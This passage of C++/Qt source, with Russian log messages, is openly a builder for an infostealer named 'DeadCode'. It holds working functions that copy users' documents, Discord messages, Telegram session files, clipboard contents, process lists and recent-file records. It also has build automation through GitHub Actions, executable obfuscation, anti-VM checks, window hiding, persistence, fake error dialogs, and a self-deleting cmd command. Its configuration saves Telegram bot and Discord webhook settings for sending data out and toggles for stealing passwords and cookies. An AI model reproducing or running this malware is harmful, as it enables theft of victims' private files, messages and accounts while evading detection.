        for (const auto& entry : std::filesystem::directory_iterator(modsPath)) {
            if (entry.path().extension() == ".jar") {
                std::string destFilePath = destModsDir + "\\" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                collectedFiles.push_back(destFilePath);
                result += "Mod: " + destFilePath + "\n";
            }
        }
        emitLog("Моды Minecraft скопированы в: " + QString::fromStdString(destModsDir));
    }

    emitLog("Кража данных Minecraft завершена");
    return result;
}

// Реализация GrabFiles
std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
    emitLog("Начало граббинга файлов...");

    std::string grabDir = dir + "\\GrabbedFiles";
    std::filesystem::create_directories(grabDir);

    std::vector<std::string> grabbedFiles;
    const char* userProfilePath = std::getenv("USERPROFILE");
    if (!userProfilePath) {
        emitLog("Ошибка: Не удалось получить путь к USERPROFILE");
        return {};
    }
    std::string userProfile(userProfilePath);

    std::vector<std::string> targetDirs = {
        userProfile + "\\Desktop",
        userProfile + "\\Documents",
        userProfile + "\\Downloads"
    };
    std::vector<std::string> targetExtensions = {".txt", ".docx", ".pdf", ".jpg", ".png"};

    for (const auto& targetDir : targetDirs) {
        if (!std::filesystem::exists(targetDir)) continue;

        for (const auto& entry : std::filesystem::recursive_directory_iterator(targetDir)) {
            if (entry.is_regular_file()) {
                auto ext = entry.path().extension().string();
                if (std::find(targetExtensions.begin(), targetExtensions.end(), ext) != targetExtensions.end()) {
                    std::string destFilePath = grabDir + "\\" + entry.path().filename().string();
                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                    grabbedFiles.push_back(destFilePath);
                    emitLog("Файл скопирован: " + QString::fromStdString(destFilePath));
                }
            }
        }
    }

    emitLog("Граббинг файлов завершен");
    return grabbedFiles;
}

// Реализация stealChatHistory
std::string MainWindow::stealChatHistory(const std::string& dir) {
    emitLog("Начало кражи истории чатов...");

    std::string chatDir = dir + "\\ChatHistory";
    std::filesystem::create_directories(chatDir);

    std::string result;
    const char* appDataPath = std::getenv("APPDATA");
    if (!appDataPath) {
        emitLog("Ошибка: Не удалось получить путь к APPDATA");
        return "";
    }
    std::string appData(appDataPath);

    // Discord chat history (leveldb logs)
    std::string discordPath = appData + decryptString(encryptedDiscordPath, 0);
    if (std::filesystem::exists(discordPath)) {
        std::string discordChatPath = chatDir + "\\discord_chat.txt";
        std::ofstream discordChatFile(discordChatPath);
        if (discordChatFile.is_open()) {
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        file.close();
                        std::regex messageRegex("\"content\":\"(.*?)\"");
                        std::smatch match;
                        std::string::const_iterator searchStart(content.cbegin());
                        while (std::regex_search(searchStart, content.cend(), match, messageRegex)) {
                            discordChatFile << "Discord Message: " << match[1].str() << "\n";
                            searchStart = match.suffix().first;
                        }
                    }
                }
            }
            discordChatFile.close();
            if (std::filesystem::file_size(discordChatPath) > 0) {
                collectedFiles.push_back(discordChatPath);
                result += "Discord Chat History: " + discordChatPath + "\n";
                emitLog("История чатов Discord сохранена: " + QString::fromStdString(discordChatPath));
            } else {
                std::filesystem::remove(discordChatPath);
            }
        }
    }

    // Telegram chat history (simplified, requires tdata parsing which is complex)
    std::string telegramPath = appData + decryptString(encryptedTelegramPath, 0);
    if (std::filesystem::exists(telegramPath)) {
        std::string telegramChatPath = chatDir + "\\telegram_chat.txt";
        std::ofstream telegramChatFile(telegramChatPath);
        if (telegramChatFile.is_open()) {
            telegramChatFile << "Telegram chat history extraction requires advanced parsing of tdata files.\n";
            telegramChatFile << "Files copied for manual analysis:\n";
            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                std::string filename = entry.path().filename().string();
                if (filename.find("key_data") == std::string::npos && filename.find("D877F783D5D3EF8C") != std::string::npos) {
                    std::string destFilePath = chatDir + "\\" + filename;
                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
                    collectedFiles.push_back(destFilePath);
                    telegramChatFile << destFilePath << "\n";
                }
            }
            telegramChatFile.close();
            if (std::filesystem::file_size(telegramChatPath) > 0) {
                collectedFiles.push_back(telegramChatPath);
                result += "Telegram Chat History (partial): " + telegramChatPath + "\n";
                emitLog("История чатов Telegram (частичная) сохранена: " + QString::fromStdString(telegramChatPath));
            } else {
                std::filesystem::remove(telegramChatPath);
            }
        }
    }

    emitLog("Кража истории чатов завершена");
    return result;
}

// Реализация collectSocialEngineeringData
std::string MainWindow::collectSocialEngineeringData(const std::string& dir) {
    emitLog("Сбор данных для социальной инженерии...");

    std::string seDir = dir + "\\SocialEngineering";
    std::filesystem::create_directories(seDir);

    std::string sePath = seDir + "\\social_engineering.txt";
    std::ofstream outFile(sePath);
    if (!outFile.is_open()) {
        emitLog("Ошибка: Не удалось создать файл для данных социальной инженерии");
        return "";
    }

    std::string result;
    // Собираем данные из буфера обмена
    if (QGuiApplication::clipboard()->text().length() > 0) {
        std::string clipboardData = QGuiApplication::clipboard()->text().toStdString();
        outFile << "Clipboard Data: " << clipboardData << "\n";
        result += "Clipboard: " + clipboardData + "\n";
    }

    // Собираем данные о запущенных процессах
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32{};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &pe32)) {
            outFile << "Running Processes:\n";
            do {
                outFile << pe32.szExeFile << "\n";
            } while (Process32Next(snapshot, &pe32));
            result += "Running Processes collected\n";
        }
        CloseHandle(snapshot);
    }

    // Собираем данные о последних открытых файлах
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        outFile << "Recent Files:\n";
        char valueName[256];
        BYTE valueData[1024];
        DWORD valueNameLen = sizeof(valueName);
        DWORD valueDataLen = sizeof(valueData);
        DWORD type;
        for (DWORD i = 0; RegEnumValueA(hKey, i, valueName, &valueNameLen, nullptr, &type, valueData, &valueDataLen) == ERROR_SUCCESS; ++i) {
            if (type == REG_SZ) {
                outFile << valueName << ": " << reinterpret_cast<char*>(valueData) << "\n";
                result += "Recent File: " + std::string(reinterpret_cast<char*>(valueData)) + "\n";
            }
            valueNameLen = sizeof(valueName);
            valueDataLen = sizeof(valueData);
        }
        RegCloseKey(hKey);
    }

    outFile.close();
    if (std::filesystem::file_size(sePath) > 0) {
        collectedFiles.push_back(sePath);
        emitLog("Данные социальной инженерии сохранены: " + QString::fromStdString(sePath));
        return result;
    } else {
        std::filesystem::remove(sePath);
        emitLog("Данные для социальной инженерии не найдены");
        return "";
    }
}

// Реализация startStealProcess
void MainWindow::startStealProcess() {
    std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + generateRandomString(8);
    emitLog("Запуск кражи данных в " + QString::fromStdString(tempDir));
    std::string result = StealAndSendData(tempDir);
    emitLog("Результат кражи: " + QString::fromStdString(result));
}

// Реализация triggerGitHubActions
void MainWindow::triggerGitHubActions() {
    emitLog("Запуск GitHub Actions Workflow...");

    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches";
    QNetworkRequest request{QUrl(url)}; // Исправили здесь
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";

    QNetworkReply* reply = manager->post(request, QJsonDocument(json).toJson());
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка при запуске GitHub Actions: " + reply->errorString());
            isBuilding = false;
        } else {
            emitLog("GitHub Actions Workflow успешно запущен");
            statusCheckTimer->start(30000);
        }
        reply->deleteLater();
    });
}

// Реализация checkBuildStatus
void MainWindow::checkBuildStatus() {
    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs";
    QNetworkRequest request{QUrl(url)}; // Исправили здесь
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка при проверке статуса сборки: " + reply->errorString());
            statusCheckTimer->stop();
            isBuilding = false;
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QJsonArray runs = obj["workflow_runs"].toArray();
            if (runs.isEmpty()) {
                emitLog("Не найдено активных запусков GitHub Actions");
                return;
            }

            QJsonObject latestRun = runs[0].toObject();
            QString status = latestRun["status"].toString();
            QString conclusion = latestRun["conclusion"].toString();
            runId = latestRun["id"].toInt();

            emitLog("Статус сборки: " + status + ", Заключение: " + (conclusion.isEmpty() ? "в процессе" : conclusion));

            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка успешно завершена, загрузка артефактов...");
                    downloadArtifacts();
                } else {
                    emitLog("Сборка завершилась с ошибкой: " + conclusion);
                    isBuilding = false;
                }
            }
        }
        reply->deleteLater();
    });
}

// Реализация downloadArtifacts
void MainWindow::downloadArtifacts() {
    QString githubToken = githubTokenLineEdit->text();
    QString githubRepo = githubRepoLineEdit->text();

    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: Токен GitHub или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs/" + QString::number(runId) + "/artifacts";
    QNetworkRequest request{QUrl(url)}; // Исправили здесь
    request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() != QNetworkReply::NoError) {
            emitLog("Ошибка при получении артефактов: " + reply->errorString());
            isBuilding = false;
        } else {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QJsonArray artifacts = obj["artifacts"].toArray();
            if (artifacts.isEmpty()) {
                emitLog("Артефакты не найдены");
                isBuilding = false;
                return;
            }

            QJsonObject artifact = artifacts[0].toObject();
            QString downloadUrl = artifact["archive_download_url"].toString();
            artifactId = artifact["id"].toInt();

            QNetworkRequest downloadRequest{QUrl(downloadUrl)}; // Исправили здесь
            downloadRequest.setRawHeader("Authorization", ("Bearer " + githubTokenLineEdit->text()).toUtf8());
            downloadRequest.setRawHeader("Accept", "application/vnd.github.v3+json");

            QNetworkReply* downloadReply = manager->get(downloadRequest);
            connect(downloadReply, &QNetworkReply::finished, this, [this, downloadReply]() {
                if (downloadReply->error() != QNetworkReply::NoError) {
                    emitLog("Ошибка при загрузке артефакта: " + downloadReply->errorString());
                } else {
                    QByteArray data = downloadReply->readAll();
                    QString outputFile = QString::fromStdString(config.filename.empty() ? "DeadCode.exe" : config.filename);
                    QFile file(outputFile);
                    if (file.open(QIODevice::WriteOnly)) {
                        file.write(data);
                        file.close();
                        emitLog("Артефакт успешно загружен: " + outputFile);

                        std::string exePath = outputFile.toStdString();
                        obfuscateExecutable(exePath);
                        applyPolymorphicObfuscation(exePath);

                        if (config.silent) {
                            emitLog("Запуск процесса кражи данных в фоновом режиме...");
                            emit startStealSignal();
                        }
                    } else {
                        emitLog("Ошибка: Не удалось сохранить артефакт в " + outputFile);
                    }
                }
                downloadReply->deleteLater();
                isBuilding = false;
            });
        }
        reply->deleteLater();
    });
}

// Реализация copyIconToBuild
void MainWindow::copyIconToBuild() {
    if (config.iconPath.empty()) {
        emitLog("Иконка не указана, пропускаем копирование...");
        return;
    }

    std::string destIconPath = "builds/icon.ico";
    std::filesystem::create_directories("builds");
    try {
        if (std::filesystem::copy_file(config.iconPath, destIconPath, std::filesystem::copy_options::overwrite_existing)) {
            emitLog("Иконка скопирована в директорию сборки: " + QString::fromStdString(destIconPath));
        } else {
            emitLog("Ошибка: Не удалось скопировать иконку в " + QString::fromStdString(destIconPath));
        }
    } catch (const std::exception& e) {
        emitLog("Ошибка при копировании иконки: " + QString::fromStdString(e.what()));
    }
}

// Реализация buildExecutable
void MainWindow::buildExecutable() {
    if (isBuilding) {
        emitLog("Сборка уже выполняется, пожалуйста, подождите...");
        return;
    }

    isBuilding = true;
    emitLog("Начало сборки исполняемого файла...");

    updateConfigFromUI();
    generateEncryptionKeys();
    generatePolymorphicCode();
    generateJunkCode();
    generateBuildKeyHeader(generateRandomKey(32));
    copyIconToBuild();

    if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
        return;
    }

    std::string polyCode = generatePolymorphicCode();
    std::string junkCode = generateJunkCode();
    if (!compileBuild(polyCode, junkCode)) {
        emitLog("Ошибка: Не удалось скомпилировать билд");
        isBuilding = false;
        return;
    }

    std::string exePath = "builds/" + (config.filename.empty() ? "DeadCode.exe" : config.filename);
    obfuscateExecutable(exePath);
    applyPolymorphicObfuscation(exePath);

    emitLog("Сборка завершена: " + QString::fromStdString(exePath));
    isBuilding = false;

    if (config.silent) {
        emitLog("Запуск процесса кражи данных в фоновом режиме...");
        emit startStealSignal();
    }
}

// Реализация on_buildButton_clicked
void MainWindow::on_buildButton_clicked() {
    if (isBuilding) {
        emitLog("Сборка уже выполняется, пожалуйста, подождите...");
        return;
    }
    buildExecutable();
}

// Реализация on_iconBrowseButton_clicked
void MainWindow::on_iconBrowseButton_clicked() {
    QString iconPath = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!iconPath.isEmpty()) {
        iconPathLineEdit->setText(iconPath);
        config.iconPath = iconPath.toStdString();
        emitLog("Иконка выбрана: " + iconPath);
    }
}

// Реализация on_clearLogsButton_clicked
void MainWindow::on_clearLogsButton_clicked() {
    textEdit->clear();
    emitLog("Логи очищены");
}

// Реализация saveConfig
void MainWindow::saveConfig() {
    updateConfigFromUI();
    QString filePath = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.json)");
    if (filePath.isEmpty()) return;

    QJsonObject configObj;
    configObj["sendMethod"] = QString::fromStdString(config.sendMethod);
    configObj["buildMethod"] = QString::fromStdString(config.buildMethod);
    configObj["telegramBotToken"] = QString::fromStdString(config.telegramBotToken);
    configObj["telegramChatId"] = QString::fromStdString(config.telegramChatId);
    configObj["discordWebhook"] = QString::fromStdString(config.discordWebhook);
    configObj["filename"] = QString::fromStdString(config.filename);
    configObj["iconPath"] = QString::fromStdString(config.iconPath);
    configObj["githubToken"] = QString::fromStdString(config.githubToken);
    configObj["githubRepo"] = QString::fromStdString(config.githubRepo);
    configObj["discord"] = config.discord;
    configObj["steam"] = config.steam;
    configObj["steamMAFile"] = config.steamMAFile;
    configObj["epic"] = config.epic;
    configObj["roblox"] = config.roblox;
    configObj["battlenet"] = config.battlenet;
    configObj["minecraft"] = config.minecraft;
    configObj["arizonaRP"] = config.arizonaRP;
    configObj["radmirRP"] = config.radmirRP;
    configObj["cookies"] = config.cookies;
    configObj["passwords"] = config.passwords;
    configObj["screenshot"] = config.screenshot;
    configObj["fileGrabber"] = config.fileGrabber;
    configObj["systemInfo"] = config.systemInfo;
    configObj["socialEngineering"] = config.socialEngineering;
    configObj["chatHistory"] = config.chatHistory;
    configObj["telegram"] = config.telegram;
    configObj["antiVM"] = config.antiVM;
    configObj["fakeError"] = config.fakeError;
    configObj["silent"] = config.silent;
    configObj["autoStart"] = config.autoStart;
    configObj["persist"] = config.persist;
    configObj["selfDestruct"] = config.selfDestruct;

    QFile file(filePath);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(QJsonDocument(configObj).toJson());
        file.close();
        emitLog("Конфигурация сохранена: " + filePath);
    } else {
        emitLog("Ошибка: Не удалось сохранить конфигурацию в " + filePath);
    }
}

// Реализация loadConfig
void MainWindow::loadConfig() {
    QString filePath = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.json)");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (!file.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл конфигурации " + filePath);
        return;
    }

    QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
    file.close();

    if (doc.isNull()) {
        emitLog("Ошибка: Неверный формат файла конфигурации " + filePath);
        return;
    }

    QJsonObject configObj = doc.object();
    sendMethodComboBox->setCurrentText(configObj["sendMethod"].toString());
    buildMethodComboBox->setCurrentText(configObj["buildMethod"].toString());
    tokenLineEdit->setText(configObj["telegramBotToken"].toString());
    chatIdLineEdit->setText(configObj["telegramChatId"].toString());
    discordWebhookLineEdit->setText(configObj["discordWebhook"].toString());
    fileNameLineEdit->setText(configObj["filename"].toString());
    iconPathLineEdit->setText(configObj["iconPath"].toString());
    githubTokenLineEdit->setText(configObj["githubToken"].toString());
    githubRepoLineEdit->setText(configObj["githubRepo"].toString());
    discordCheckBox->setChecked(configObj["discord"].toBool());
    steamCheckBox->setChecked(configObj["steam"].toBool());
    steamMAFileCheckBox->setChecked(configObj["steamMAFile"].toBool());
    epicCheckBox->setChecked(configObj["epic"].toBool());
    robloxCheckBox->setChecked(configObj["roblox"].toBool());
    battlenetCheckBox->setChecked(configObj["battlenet"].toBool());
    minecraftCheckBox->setChecked(configObj["minecraft"].toBool());
    arizonaRPCheckBox->setChecked(configObj["arizonaRP"].toBool());
    radmirRPCheckBox->setChecked(configObj["radmirRP"].toBool());
    cookiesCheckBox->setChecked(configObj["cookies"].toBool());
    passwordsCheckBox->setChecked(configObj["passwords"].toBool());
    screenshotCheckBox->setChecked(configObj["screenshot"].toBool());
    fileGrabberCheckBox->setChecked(configObj["fileGrabber"].toBool());
    systemInfoCheckBox->setChecked(configObj["systemInfo"].toBool());
    socialEngineeringCheckBox->setChecked(configObj["socialEngineering"].toBool());
    chatHistoryCheckBox->setChecked(configObj["chatHistory"].toBool());
    telegramCheckBox->setChecked(configObj["telegram"].toBool());
    antiVMCheckBox->setChecked(configObj["antiVM"].toBool());
    fakeErrorCheckBox->setChecked(configObj["fakeError"].toBool());
    silentCheckBox->setChecked(configObj["silent"].toBool());
    autoStartCheckBox->setChecked(configObj["autoStart"].toBool());
    persistCheckBox->setChecked(configObj["persist"].toBool());
    selfDestructCheckBox->setChecked(configObj["selfDestruct"].toBool());

    updateConfigFromUI();
    emitLog("Конфигурация загружена: " + filePath);
}

// Реализация exportLogs
void MainWindow::exportLogs() {
    QString filePath = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (filePath.isEmpty()) return;

    QFile file(filePath);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы: " + filePath);
    } else {
        emitLog("Ошибка: Не удалось экспортировать логи в " + filePath);
    }
}

// Реализация replyFinished
void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() != QNetworkReply::NoError) {
        emitLog("Ошибка сети: " + reply->errorString());
    } else {
        emitLog("Ответ от сервера получен: " + QString::fromUtf8(reply->readAll()));
    }
    reply->deleteLater();
}

// Реализация appendLog
void MainWindow::appendLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    textEdit->append(message);
    textEdit->verticalScrollBar()->setValue(textEdit->verticalScrollBar()->maximum());
}

bool MainWindow::AntiAnalysis() {
    emitLog("Проверка на анализ...");
    return isRunningInVM(); // Если работает в VM, считаем, что это анализ
}

void MainWindow::Stealth() {
    emitLog("Применение скрытности...");
    HWND hwnd = reinterpret_cast<HWND>(this->winId());
    ShowWindow(hwnd, SW_HIDE); // Скрываем окно
}

void MainWindow::Persist() {
    emitLog("Установка персистентности...");
    setupPersistence(); // Уже есть метод для этого
}

void MainWindow::FakeError() {
    emitLog("Показ фальшивой ошибки...");
    MessageBoxA(nullptr, decryptString(encryptedErrorMessage, 0).c_str(), "Critical Error", MB_ICONERROR);
}

void MainWindow::SelfDestruct() {
    emitLog("Запуск самоуничтожения...");
    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        std::string cmd = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > NUL & del \"" + std::string(exePath) + "\"";
        system(cmd.c_str());
        QApplication::quit();
    } else {
        emitLog("Ошибка самоуничтожения: не удалось получить путь к файлу");
    }
}

bool MainWindow::checkDependencies() {
    emitLog("Проверка зависимостей...");
    // Проверяем наличие OpenSSL и других библиотек
    if (OPENSSL_VERSION_NUMBER < 0x10100000L) {
        emitLog("Ошибка: требуется OpenSSL версии 1.1.0 или выше");
        return false;
    }
    return true;
}

void MainWindow::runTests() {
    emitLog("Запуск тестов...");
    if (checkDependencies()) {
        emitLog("Все зависимости на месте");
    } else {
        emitLog("Тесты провалены: отсутствуют зависимости");
    }
}